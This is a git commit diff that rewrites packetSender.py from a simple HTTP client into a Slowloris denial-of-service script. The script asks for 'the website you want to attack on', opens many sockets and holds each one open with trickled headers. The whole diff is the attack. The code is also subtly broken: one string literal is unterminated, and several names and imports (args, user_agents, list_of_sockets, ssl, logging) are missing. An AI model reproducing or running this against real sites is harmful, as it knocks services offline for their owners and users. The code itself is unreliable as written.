a88db8db8eac9bac76344e6b8da27fe32e273021
prajwollamichhane11 <prajwollamichhane11@gmail.com>
2019-04-27 08:59:44 +0545

    packetSender.py

--- packetSender.py
+++ packetSender.py
@@ -2,41 +2,61 @@ import socket
 import random
 import time
 
-try:
+
+
+def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-except socket.error:
-    print("Failed to Connect")
-    sys.exit();
+    s.settimeout(4)
 
-print("Socket Created")
+    s = ssl.wrap_socket(s)
 
-host = input()
-port = 80
+    s.connect((ip, 80))
 
-try:
-    remote_ip = socket.gethostbyname(host)
-except socket.gaierror:
-    print("Hostname could not be received")
-    sys.exit()
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+    if args.randuseragent:
+        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
+    else:
+        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
+    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+    return s
 
-print ("IP Address: "+ remote_ip)
 
-s.connect((remote_ip,port))
+def main():
+    ip = input("Enter the website you want to attack on: ")
+    socket_count = int(input("Enter the number of sockets you want to create: ))
+    logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
-print("Socket Connected to"+ host + "using IP" + remote_ip)
+    logging.info("Creating sockets...")
+    for i in range(socket_count):
+        try:
+            logging.debug("Socket %s", i)
+            s = init_socket(ip)
+        except socket.error:
+            break
+        list_of_sockets.append(s)
 
-message = "GET/HTTP/1.1\r\n\r\n"
+    while True:
+        try:
+            logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
+            for s in list(list_of_sockets):
+                try:
+                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                except socket.error:
+                    list_of_sockets.remove(s)
 
-try:
-    s.sendall(message.encode())
-except socket.error:
-    print("Did not Send Successfully")
-    sys.exit()
+            for _ in range(socket_count - len(list_of_sockets)):
+                logging.debug("Recreating socket...")
+                try:
+                    s = init_socket(ip)
+                    if s:
+                        list_of_sockets.append(s)
+                except socket.error:
+                    break
+            time.sleep(15)
 
-print("Message Sent Successfully")
+        except (KeyboardInterrupt, SystemExit):
+            print("\nStopping Slowloris...")
+            break
 
-reply = s.recv(4096)
-
-print(reply.decode())
-
-s.close()
+if __name__ == "__main__":
+    main()
